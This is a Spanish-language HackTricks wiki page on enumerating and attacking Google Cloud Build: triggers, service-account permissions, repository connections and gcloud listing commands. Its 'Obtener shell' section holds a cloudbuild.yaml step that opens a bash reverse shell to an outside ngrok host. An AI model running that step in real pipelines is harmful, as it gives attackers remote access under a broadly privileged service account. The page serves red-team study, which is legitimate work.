# GCP - Cloud Build Enum

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informaci√≥n B√°sica

Google Cloud Build es una plataforma CI/CD gestionada que **automatiza los procesos de construcci√≥n** y lanzamiento de software, integr√°ndose con **repositorios de c√≥digo fuente** y soportando una amplia gama de lenguajes de programaci√≥n. **Permite a los desarrolladores construir, probar y desplegar c√≥digo autom√°ticamente** mientras proporciona flexibilidad para personalizar los pasos y flujos de trabajo de construcci√≥n.

Cada Cloud Build Trigger est√° **relacionado con un Cloud Repository o directamente conectado con un repositorio externo** (Github, Bitbucket y Gitlab).

{% hint style="success" %}
No pude ver ninguna forma de robar el token de Github/Bitbucket desde aqu√≠ o desde Cloud Repositories porque cuando se descarga el repo se accede a trav√©s de una URL [https://source.cloud.google.com/](https://source.cloud.google.com/) y Github no es accedido por el cliente.
{% endhint %}

### Eventos

El Cloud Build puede ser activado si:

* **Push a una rama**: Especificar la rama
* **Push de una nueva etiqueta**: Especificar la etiqueta
* **Pull request**: Especificar la rama que recibe el PR
* **Invocaci√≥n Manual**
* **Mensaje Pub/Sub:** Especificar el tema
* **Evento de Webhook**: Expondr√° una URL HTTPS y la solicitud debe estar autenticada con un secreto

### Ejecuci√≥n

Hay 3 opciones:

* Un yaml/json **especificando los comandos** a ejecutar. Usualmente: `/cloudbuild.yaml`
* Solo uno que puede ser especificado ‚Äúen l√≠nea‚Äù en la consola web y en el cli
* Opci√≥n m√°s com√∫n
* Relevante para acceso no autenticado
* Un **Dockerfile** para construir
* Un **Buildpack** para construir

### Permisos de SA

La **Service Account tiene el alcance `cloud-platform`**, por lo que puede **usar todos los privilegios.** Si **no se especifica ninguna SA** (como cuando se hace submit) se usar√° la **SA predeterminada** `<proj-number>@cloudbuild.gserviceaccount.com`.

Por defecto no se otorgan permisos, pero es bastante f√°cil otorgarle algunos:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Aprobaciones

Es posible configurar un Cloud Build para **requerir aprobaciones para las ejecuciones de construcci√≥n** (deshabilitado por defecto).

### Aprobaciones de PR

Cuando el trigger es PR, debido a que **cualquiera puede realizar PRs a repositorios p√∫blicos**, ser√≠a muy peligroso simplemente **permitir la ejecuci√≥n del trigger con cualquier PR**. Por lo tanto, por defecto, la ejecuci√≥n solo ser√° **autom√°tica para propietarios y colaboradores**, y para ejecutar el trigger con PRs de otros usuarios, un propietario o colaborador debe comentar `/gcbrun`.

<figure><img src="../../../.gitbook/assets/image (150).png" alt="" width="563"><figcaption></figcaption></figure>

### Conexiones y Repositorios

Las conexiones pueden ser creadas sobre:

* **GitHub:** Mostrar√° un prompt de OAuth pidiendo permisos para **obtener un token de Github** que ser√° almacenado dentro del **Secret Manager.**
* **GitHub Enterprise:** Pedir√° instalar un **GithubApp**. Se crear√° y almacenar√° en este proyecto un **token de autenticaci√≥n** de tu host de GitHub Enterprise como un secreto del **Secret Manager**.
* **GitLab / Enterprise:** Necesitas **proporcionar el token de acceso API y el token de acceso de lectura API** que ser√°n almacenados en el **Secret Manager.**

Una vez generada una conexi√≥n, puedes usarla para **vincular repositorios a los que la cuenta de Github tiene acceso**.

Esta opci√≥n est√° disponible a trav√©s del bot√≥n:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Ten en cuenta que los repositorios conectados con este m√©todo **solo est√°n disponibles en Triggers usando 2¬™ generaci√≥n.**
{% endhint %}

### Conectar un Repositorio

Esto no es lo mismo que una **`conexi√≥n`**. Esto permite **diferentes** formas de obtener **acceso a un repositorio de Github o Bitbucket** pero **no genera un objeto de conexi√≥n, sino que genera un objeto de repositorio (de 1¬™ generaci√≥n).**

Esta opci√≥n est√° disponible a trav√©s del bot√≥n:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Almacenamiento

A veces Cloud Build **generar√° un nuevo almacenamiento para almacenar los archivos para el trigger**. Esto sucede, por ejemplo, en el ejemplo que GCP ofrece con:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Un bucket de Storage llamado [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) es creado para almacenar un `.tgz` con los archivos a ser utilizados.

### Obtener shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
Instalar gcloud dentro de cloud build:
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### Enumeraci√≥n

Podr√≠as encontrar **informaci√≥n sensible en configuraciones de compilaci√≥n y registros**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Escalada de Privilegios

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Acceso No Autenticado

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Post Explotaci√≥n

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
